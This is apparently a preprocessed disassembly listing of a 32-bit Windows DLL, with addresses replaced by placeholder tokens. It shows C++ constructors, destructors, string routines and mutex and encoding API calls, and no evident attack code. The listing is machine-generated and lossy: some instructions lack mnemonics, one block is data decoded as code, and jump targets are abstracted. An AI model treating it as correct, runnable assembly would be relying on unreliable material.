push eax
call sub_10005b90
mov eax esi
cmp eax esi
jae r-xdata
sub_10005dc0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c253
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx ecx
push 0x2
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x6c ] eax
mov [ ebx ] r--data
call sub_1001a818
xor esi esi
add esp 0x4
cmp eax esi
je r-xdata
xor eax eax
xor ecx ecx
mov [ eax ] cx
jmp r-xdata
xor edi edi
push 0xc
push rw-data
push 0x3e
push rw-data
mov ecx eax
call sub_10012710
mov edi eax
jmp r-xdata
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] r--data
mov [ ebx ] r--data
mov [ ebx + 0x8 ] r--data
mov [ ebx + 0x24 ] esi
mov [ ebx + 0x28 ] esi
mov [ ebx + 0x2c ] esi
mov [ ebp - 0x4 ] esi
mov [ ebx + 0x38 ] esi
mov [ ebx + 0x3c ] esi
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x4c ] esi
mov [ ebx + 0x50 ] esi
mov [ ebx + 0x54 ] esi
push 0x18
mov [ ebp - 0x4 ] 0x2
call sub_1001a818
add esp 0x4
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x4 ] 0x3
cmp eax esi
je r-xdata
xor eax eax
mov ecx [ rw-data ]
sub esp 0x10
mov edx esp
mov [ edx ] ecx
mov ecx [ rw-data ]
mov [ edx + 0x4 ] ecx
mov ecx [ rw-data ]
mov [ edx + 0x8 ] ecx
mov ecx [ rw-data ]
mov [ edx + 0xc ] ecx
mov edx [ ebp - 0x64 ]
mov ecx [ ebp - 0x6c ]
push edx
push ecx
mov ecx eax
call sub_100187f0
jmp r-xdata
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call j_sub_100127b0
push 0x64
mov [ ebp - 0x64 ] eax
call sub_1001a818
add esp 0x4
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x4 ] 0x4
cmp eax esi
je r-xdata
mov eax [ ebx + 0x14 ]
cmp eax esi
je r-xdata
mov ecx edi
call sub_10012740
push edi
call sub_10019ce4
add esp 0x4
mov edx [ ebp - 0x64 ]
push edx
mov [ ebp - 0x4 ] 0x2
mov [ ebx + 0x14 ] eax
call sub_1001a3eb
add esp 0x4
cmp edi esi
je r-xdata
xor ecx ecx
lea ecx [ eax + 0x4 ]
jmp r-xdata
mov [ ebp - 0x64 ] esi
push 0xc
push rw-data
push 0x32
push rw-data
mov ecx eax
call sub_10012710
mov [ ebp - 0x64 ] eax
jmp r-xdata
push 0x18
mov [ ebx + 0x18 ] ecx
mov [ ebx + 0x1c ] eax
call sub_1001a818
add esp 0x4
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x4 ] 0x5
cmp eax esi
je r-xdata
mov ecx 0xc
mov esi eax
lea edi [ ebp - 0x44 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
cmp [ ebp - 0x4c ] edx
jb r-xdata
mov eax [ eax ]
push 0x31
lea eax [ ebp - 0x43 ]
push esi
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x44 ] 0x0
call sub_1001a9b0
add esp 0xc
lea ecx [ ebp - 0x60 ]
push ecx
mov ecx [ ebp - 0x64 ]
call sub_10012d50
mov edx 0x10
cmp [ eax + 0x14 ] edx
jb r-xdata
mov esi [ ebp - 0x64 ]
test esi esi
je r-xdata
mov edx [ ebp - 0x60 ]
push edx
call sub_10019ce4
add esp 0x4
push 0xc
call sub_1001a818
add esp 0x4
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x4 ] 0x6
test eax eax
je r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
xor eax eax
push 0x32
lea ecx [ ebp - 0x44 ]
push ecx
mov ecx eax
call sub_10016210
jmp r-xdata
xor eax eax
lea ecx [ ebx + 0x8 ]
push ecx
mov ecx eax
call sub_100023e0
jmp r-xdata
push 0x3c
mov [ ebp - 0x4 ] 0x2
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x34 ] 0xff
call sub_1001a818
add esp 0x4
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x4 ] 0x7
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_10018d70
jmp r-xdata
push 0x8
mov [ ebp - 0x4 ] 0x2
mov [ ebx + 0xc ] eax
call sub_1001a818
add esp 0x4
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x4 ] 0x8
test eax eax
je r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x4
cmp ecx eax
je r-xdata
mov edx [ rw-data ]
mov [ ebx + 0x20 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x60 ] eax
movzx eax [ rw-data ]
mov [ ebx + 0x5c ] edx
mov edx [ ebx ]
mov edx [ edx + 0x10 ]
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
call edx
mov edi [ ebx + 0x24 ]
lea eax [ ebp - 0x6c ]
sub edi edi
push eax
lea ecx [ ebx + 0x24 ]
mov [ ebp - 0x6c ] ebx
sar edi 0x2
call sub_100035d0
mov eax [ ebx + 0x28 ]
mov edx [ ebx + 0x24 ]
lea ecx [ eax - 0x4 ]
lea edx [ edx + edi * 4 ]
cmp edx ecx
je r-xdata
push 0x0
push 0x0
push eax
push ecx
push edx
call sub_10003220
add esp 0x14
sub_100060b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c2a1
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x8 ] r--data
mov eax [ esi + 0x20 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10019ce4
mov ebx [ esi + 0xc ]
xor edi edi
add esp 0x4
cmp ebx edi
je r-xdata
mov ebx [ esi + 0x10 ]
cmp ebx edi
je r-xdata
mov ecx ebx
call sub_100020d0
push ebx
call sub_10019ce4
add esp 0x4
mov ebx [ esi + 0x14 ]
cmp ebx edi
je r-xdata
mov ecx ebx
call sub_10015ef0
push ebx
call sub_10019ce4
add esp 0x4
mov eax [ esi + 0x4c ]
cmp eax edi
je r-xdata
mov ecx ebx
call sub_10017420
push ebx
call sub_10019ce4
add esp 0x4
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov eax [ esi + 0x38 ]
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
mov ecx [ esi + 0x50 ]
lea edx [ esi + 0x58 ]
push edx
push ecx
push eax
call sub_10005b20
mov edx [ esi + 0x4c ]
push edx
call sub_10019ce4
add esp 0x14
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x40 ] edi
mov eax [ esi + 0x24 ]
cmp eax edi
je r-xdata
push eax
call sub_10019ce4
add esp 0x4
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_10019ce4
add esp 0x4
sub_100061c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c102
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ edi + 0x4 ]
mov esi [ ebp + 0x8 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov eax [ edi + 0x4 ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
push 0x1
mov ecx edi
call sub_10005d40
sub esi eax
mov eax 0x66666667
imul esi
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x14
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov cx [ esi ]
mov [ eax ] cx
mov dl [ esi + 0x2 ]
mov [ eax + 0x2 ] dl
mov cl [ esi + 0x3 ]
add esi 0x4
mov [ eax + 0x3 ] cl
push esi
mov ecx [ edi ]
lea eax [ esi + esi * 4 ]
lea ecx [ ecx + eax * 4 ]
mov eax [ edi + 0x4 ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
push 0x1
mov ecx edi
call sub_10005d40
mov dx [ ecx ]
mov [ eax ] dx
movzx edx [ ecx + 0x2 ]
mov [ eax + 0x2 ] dl
movzx edx [ ecx + 0x3 ]
add ecx 0x4
mov [ eax + 0x3 ] dl
push ecx
jmp r-xdata
lea ecx [ eax + 0x4 ]
call sub_100025c0
sub_100062b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c2d8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov edx [ eax + 0x14 ]
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx edi
call edx
movzx eax [ eax ]
push eax
lea ecx [ ebp - 0x20 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_10005940
mov eax [ ebp - 0x30 ]
xor ecx ecx
mov [ ebp - 0x4 ] 0x2
cmp eax ecx
je r-xdata
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x28 ] ecx
cmp [ ebp - 0x20 ] cx
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x2c ]
lea ecx [ ebp - 0x24 ]
push ecx
push edx
push eax
call sub_100024a0
mov eax [ ebp - 0x30 ]
push eax
call sub_10019ce4
add esp 0x14
xor ecx ecx
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ esi + 0x4c ]
call sub_100061c0
mov ecx [ esi + 0xc ]
mov edx [ ecx ]
mov eax [ edx + 0xc ]
push edi
call eax
mov cx [ ebp - 0x20 ]
mov dl [ ebp - 0x1e ]
sub esp 0x14
mov eax esp
mov [ eax ] cx
mov cl [ ebp - 0x1d ]
mov [ eax + 0x2 ] dl
lea edx [ ebp - 0x1c ]
mov [ ebp + 0x8 ] esp
mov [ eax + 0x3 ] cl
push edx
lea ecx [ eax + 0x4 ]
call sub_100025c0
mov ecx [ esi + 0xc ]
mov eax [ ecx ]
mov edx [ eax + 0x14 ]
call edx
mov esi [ ebp - 0x1c ]
test esi esi
je r-xdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x18 ]
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x10 ]
push ecx
push edx
push esi
call sub_100024a0
push esi
call sub_10019ce4
add esp 0x14
mov edx [ edi ]
mov edx [ edx + 0x14 ]
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
call edx
mov cx [ eax ]
mov dl [ eax + 0x2 ]
mov [ ebp - 0x20 ] cx
mov cl [ eax + 0x3 ]
add eax 0x4
mov [ ebp - 0x1d ] cl
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] dl
call sub_10004e30
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
mov cx [ ebp - 0x20 ]
mov dl [ ebp - 0x1e ]
sub esp 0x14
mov eax esp
mov [ eax ] cx
mov cl [ ebp - 0x1d ]
mov [ eax + 0x2 ] dl
lea edx [ ebp - 0x1c ]
mov [ ebp + 0x8 ] esp
mov [ eax + 0x3 ] cl
push edx
lea ecx [ eax + 0x4 ]
call sub_100025c0
mov ecx esi
call sub_10004c90
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x40 ]
lea ecx [ ebp - 0x38 ]
push ecx
push edx
push eax
call sub_100024a0
mov eax [ ebp - 0x44 ]
push eax
call sub_10019ce4
add esp 0x14
sub_10006450
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c310
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor edx edx
xor ebx ebx
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0x6 ]
dec ecx
mov [ ebp - 0x4 ] ebx
cmp ecx 0x35
ja r-xdata
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
movzx ecx [ ecx + lookup_table_10006860 ]
jmp [ ecx * 4 + jump_table_10006830 ]
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov ecx esi
call sub_10005110
jmp r-xdata
mov ecx esi
call sub_10004170
jmp r-xdata
cmp [ eax + 0xc ] 0x4
jne r-xdata
cmp [ eax + 0xc ] 0x4
jne r-xdata
mov eax [ rw-data ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x14 ] esp
push ebx
call sub_10003ae0
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov eax [ esi + 0x5c ]
mov edx [ edx + 0x8 ]
push eax
call edx
mov eax [ rw-data ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x14 ] esp
push ebx
call sub_10003ae0
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov eax [ esi + 0x60 ]
mov edx [ edx + 0x8 ]
push eax
call edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x2
jne r-xdata
mov ecx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push ecx
push eax
lea edx [ ebp - 0x2c ]
push edx
mov ecx esi
call sub_100056d0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x2c ] bx
jne r-xdata
cmp [ eax + 0xc ] 0x4
jne r-xdata
cmp [ eax + 0xc ] 0x2
jne r-xdata
cmp [ eax + 0xc ] 0x4
jne r-xdata
cmp [ eax + 0xc ] 0x2
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
lea edx [ eax - 0x1 ]
cmp edx 0x2932dfe
ja r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cmp [ esi + 0x60 ] ebx
jbe r-xdata
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov ecx [ esi + 0x50 ]
sub ecx [ esi + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax 0x66666667
imul ecx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
xor edi edi
add ecx edx
je r-xdata
sub esp 0x14
lea edx [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x14 ] esp
push edx
call sub_100026f0
mov ecx [ esi + 0xc ]
mov eax [ ecx ]
mov edx [ eax + 0x14 ]
call edx
mov ecx [ esi + 0x50 ]
sub ecx [ esi + 0x4c ]
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0x24 ]
jne r-xdata
mov eax [ eax + 0x8 ]
mov edi [ eax ]
cmp edi ebx
je r-xdata
mov edx [ esi + 0x28 ]
sub edx [ esi + 0x24 ]
mov eax [ eax + 0x8 ]
movzx ebx [ eax ]
mov edi 0x1
sar edx 0x2
cmp edx edi
jbe r-xdata
mov eax [ eax + 0x8 ]
mov edi [ eax ]
cmp edi ebx
je r-xdata
mov eax [ eax + 0x8 ]
movzx ebx [ eax ]
mov edx [ esi + 0x50 ]
sub edx [ esi + 0x4c ]
lea ecx [ esi + 0x4c ]
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
mov edi 0x1
add eax edx
cmp eax edi
jbe r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov [ esi + 0x5c ] eax
jmp r-xdata
cmp eax [ esi + 0x5c ]
ja r-xdata
mov edx [ esi + 0x4c ]
mov eax [ ebp - 0x14 ]
cmp [ ebx + edx ] ax
jne r-xdata
lea ecx [ ebp - 0x2c ]
call sub_10002720
jmp r-xdata
mov ecx [ esi + 0x4c ]
mov dx [ ebp - 0x2c ]
lea ebx [ ebx + ebx * 4 ]
add ebx ebx
add ebx ebx
cmp [ ebx + ecx ] dx
jne r-xdata
lea ecx [ ebp - 0x2c ]
call sub_10002720
jmp r-xdata
mov edx [ edi ]
mov eax [ edx + 0xc ]
mov ecx edi
call eax
test ax ax
je r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax + edi * 4 ]
mov edx [ ecx ]
mov eax [ edx + 0xc ]
call eax
cmp ax bx
je r-xdata
xor bl bl
mov eax [ edi ]
mov edx [ eax + 0x14 ]
lea ecx [ ebp - 0x40 ]
push ecx
mov ecx edi
call edx
mov edx 0x1
cmp [ eax ] bx
je r-xdata
mov esi [ ecx ]
lea edx [ esi + 0x14 ]
mov [ esi + 0x60 ] eax
jmp r-xdata
mov ecx [ esi + 0x50 ]
sub ecx [ esi + 0x4c ]
mov eax 0x66666667
imul ecx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
inc edi
add ecx edx
add ebx 0x14
cmp edi ecx
jb r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x10 ]
call eax
mov al [ ebp - 0xd ]
mov ecx [ esi + 0x50 ]
sub ecx [ esi + 0x4c ]
inc al
movzx ebx al
mov [ ebp - 0xd ] al
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
sub esp 0x14
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x14 ] esp
push eax
call sub_100026f0
mov ecx esi
call sub_10004c90
mov eax [ esi + 0x4c ]
add eax ebx
push eax
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ esi + 0x4c ]
call sub_10005cf0
lea edx [ ebp - 0x2c ]
push edx
lea ecx [ esi + 0x4c ]
call sub_100061c0
lea ecx [ ebp - 0x14 ]
push ecx
lea ecx [ esi + 0x24 ]
mov [ ebp - 0x14 ] edi
call sub_10002060
jmp r-xdata
mov eax [ esi + 0x24 ]
lea edi [ eax + edi * 4 ]
push edi
lea edx [ ebp - 0x18 ]
push edx
lea ecx [ esi + 0x24 ]
call sub_10003320
jmp r-xdata
mov ecx [ esi + 0x28 ]
sub ecx [ esi + 0x24 ]
inc edi
sar ecx 0x2
cmp edi ecx
jb r-xdata
test bl bl
je r-xdata
lea ecx [ ebp - 0x40 ]
call sub_10002720
mov bl dl
jmp r-xdata
lea eax [ edi + edi * 4 ]
lea eax [ esi + eax * 4 ]
push eax
lea edx [ ebp - 0x18 ]
push edx
call sub_10005cf0
inc edi
add edx 0x14
cmp edi eax
jb r-xdata
jmp r-xdata
jmp r-xdata
push edi
mov ecx esi
call sub_100062b0
jmp r-xdata
test dl 0x1
je r-xdata
cmp [ edx ] bx
je r-xdata
jmp r-xdata
sub_1000686c
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
add al [ ebx ]
add al 0xb
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
add eax 0xb0b0b06
or ecx [ ebx ]
or ecx [ ebx ]
or eax [ edi ]
or [ ecx ] cl
or cl ah
int3
sub_100068a0
push ebp
mov ebp esp
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp eax esi
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax esi
cmp eax edi
jae r-xdata
push r--data
call sub_10019141
mov ebx [ ebp + 0x14 ]
mov edx edi
cmp edi ebx
jb r-xdata
mov edi eax
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov edx ebx
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
cmp edi ebx
jae r-xdata
mov si [ eax ]
cmp si [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x10 ]
lea eax [ eax + esi * 2 ]
test edx edx
je r-xdata
xor eax eax
cmp edi ebx
setne al
pop edi
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0x10
movzx eax [ eax ]
cmp ax [ ecx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jne r-xdata
add eax 0x2
add ecx 0x2
dec edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
jmp r-xdata
sub_10006930
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0xffffffff
ja r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10019ba5
push r--data
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0xc ] r--data
call sub_1001a898
push ecx
call sub_1001a818
add esp 0x4
test eax eax
jne r-xdata
sub_10006980
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_10019141
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x10
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov ecx esi
mov [ ecx + eax ] 0x0
mov ecx [ esi ]
mov [ ecx + eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub eax edi
add ebx ecx
push eax
add ebx edi
add edx ecx
push ebx
push edx
call sub_1001a060
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_10006a10
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c330
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov esi eax
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0xfffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov [ ebp + 0x8 ] eax
jmp r-xdata
cmp ecx 0xffffffff
ja r-xdata
mov esi 0xfffffffe
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x18 ] 0x0
call sub_10019ba5
push r--data
lea edx [ ebp - 0x28 ]
push edx
mov [ ebp - 0x28 ] r--data
call sub_1001a898
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
add ecx 0x18
mov [ ebp - 0x4 ] 0x2
call sub_10006930
mov [ ebp + 0x8 ] eax
mov eax r-xdata
retn
push ecx
call sub_1001a818
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x0
mov [ edi ] eax
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ebx
cmp esi 0x10
jb r-xdata
mov ecx [ edi ]
push ecx
call sub_10019ce4
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov [ edi + ebx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edi eax
push ebx
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_10019cf0
add esp 0xc
sub_10006b4b
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_1001a898
int3
mov edx [ esi ]
push edx
call sub_10019ce4
add esp 0x4
sub_10006b80
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax edx
push esi
lea esi [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax esi
sar eax 0x1
push eax
mov eax [ ecx + 0x10 ]
push edx
push eax
push 0x0
call sub_100068a0
neg eax
sbb eax eax
inc eax
pop esi
pop ebp
retn
sub_10006bc0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi ecx
xor eax eax
push edi
mov [ ebp - 0x4 ] esi
cmp [ esi + 0x1c ] eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
mov ebx [ esi + 0x1c ]
lea eax [ ebx + ebx ]
push 0x1
push eax
call sub_1001a8ef
mov edi eax
add esp 0x8
add esi 0xc
test edi edi
jne r-xdata
push 0x0
push eax
call [ WaitForSingleObject@IAT ]
test eax eax
jne r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
jb r-xdata
xor eax eax
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
xor eax eax
mov [ esi ] ax
mov esi [ esi ]
mov edx [ ebp - 0x4 ]
xor ecx ecx
mov [ esi ] cx
mov eax [ edx + 0x44 ]
push eax
call [ ReleaseMutex@IAT ]
test eax eax
jne r-xdata
mov esi [ esi ]
push 0x0
push 0x0
lea eax [ ebx + ebx ]
push eax
push edi
push ebx
push ecx
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
cmp [ esi + 0x14 ] 0x8
mov ebx eax
mov [ esi + 0x10 ] 0x0
jb r-xdata
push 0x10
call sub_1001a818
add esp 0x4
test eax eax
je r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] r--data
call sub_10019ba5
push r--data
lea edx [ ebp - 0x10 ]
push edx
call sub_1001a898
mov cx [ rw-data ]
mov dl [ rw-data ]
mov [ eax + 0x8 ] edi
pop edi
pop esi
mov [ eax + 0xc ] ebx
mov [ eax + 0x4 ] cx
mov [ eax + 0x6 ] 0x64
mov [ eax + 0x7 ] dl
mov [ eax ] 0x0
pop ebx
mov esp ebp
pop ebp
retn
sub_10006cf0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
cmp ebx 0xfffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_100190f4
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
push eax
push ebx
call sub_10006a10
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
test ebx ebx
jne r-xdata
cmp ebx 0x10
jae r-xdata
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov [ esi + 0x10 ] ebx
cmp eax 0x10
jb r-xdata
push edi
mov edi [ esi + 0x10 ]
cmp ebx edi
jae r-xdata
mov [ esi ] 0x0
mov esi [ esi ]
cmp eax 0x10
jb r-xdata
mov edi ebx
mov [ esi + 0x10 ] edi
